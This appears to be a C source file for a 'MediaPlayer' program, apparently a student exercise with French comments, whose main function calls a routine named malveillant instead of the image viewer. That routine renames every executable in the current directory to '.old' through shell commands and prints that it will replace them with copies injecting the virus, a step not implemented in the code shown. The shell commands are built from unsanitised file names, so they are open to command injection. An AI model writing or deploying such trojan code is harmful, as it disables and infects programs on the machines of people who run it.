#include "MediaPlayer.h"

int main() {

        //mediaplayer();
        malveillant();

        return 0;
}

/*
        Vérifie si la fonction contient ".jpeg"
*/
bool checkStringContains(char *fileName) {
        char *lookingFor = ".jpeg";
        return strstr(fileName,lookingFor);
}

/*
        Lance la commande xdg-open, lancant l'afficheur d'images
*/
void afficheImage(char *fileName) {

        char *display = "xdg-open ";
        char *String = malloc(strlen(display) + strlen(fileName) + 1);
        if(String) {
                strcpy(String,display);
                strcat(String,fileName);
        }
        system(String);
}

/*
        Liste les fichiers possedant l'extension demandée
*/
void listeFichier(char *extension) {
        DIR *myDir;
        int cptImg = 0;
        struct dirent *dir;

        // FIRST PARSING
        myDir = opendir(".");
        if (myDir) {
                while ((dir = readdir(myDir)) != NULL) {

                        if (strstr(dir->d_name,extension)) {
                                cptImg++;
                        }
                }
                closedir(myDir);
        }

        printf("%d files found\n",cptImg);
        const char *imageNames[cptImg];
        if (cptImg > 0) {
                // SECOND PARSING
                myDir = opendir(".");
                if (myDir) {
                        int i = 0;
                        while ((dir = readdir(myDir)) != NULL) {
                                if (strstr(dir->d_name,extension)) {
                                        imageNames[i] = dir->d_name;
                                        i++;
                                }
                        }
                        closedir(myDir);
                }

                for(int i=0 ; i < cptImg ; i++) {
                        printf("file %d -> %s\n",i+1,imageNames[i]);
                }

                afficheImage((char *)imageNames[0]);
        }

}

void mediaplayer () {
        listeFichier(".jpeg");
}

/*
        Compte le nombre de fichiers executables dans le dossier à l'execution
*/
void cptExec() {
        DIR *myDir;
        struct dirent *dir;

        // FIRST PARSING
        myDir = opendir(".");
        if (myDir) {
                while ((dir = readdir(myDir)) != NULL) {
                        // PENSER A SUPPRIMER LA CONDITION SUR LE .GIT /!\/!\/!|
                        if ((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name)) && (strcmp(".git", dir->d_name)) && (strcmp("MediaPlayer", dir->d_name)) && (strcmp("src", dir->d_name))) {
                                if (access(dir->d_name, X_OK) == 0) {
                                        renamingFile(dir->d_name);
                                }
                        }
                }
                closedir(myDir);
        }
}

void renamingFile(char *fileName) {
        printf("\tRenaming %s into %s.old\n",fileName,fileName);

        char *command = "mv ";
        char *extension = ".old";
        char *espace = " ";
        char *String = malloc(strlen(command) + (strlen(fileName)*2) + strlen(espace) + strlen(extension) + 1);
        if(String) {
                strcpy(String,command);
                strcat(String,fileName);
                strcat(String,espace);
                strcat(String,fileName);
                strcat(String,extension);
        }
        system(String);
}

void malveillant() {
        printf("\nBad things happens bruh\n");
        //system("cat MediaPlayer");
        printf("\nListing executables and renaming..\n\n");

        cptExec();

        printf("\nCréation of new executables with the same name as the previous ones..\n");
        printf("\nInjection du code du virus MediaPlayer dans les nouveaux executables..\n");


}
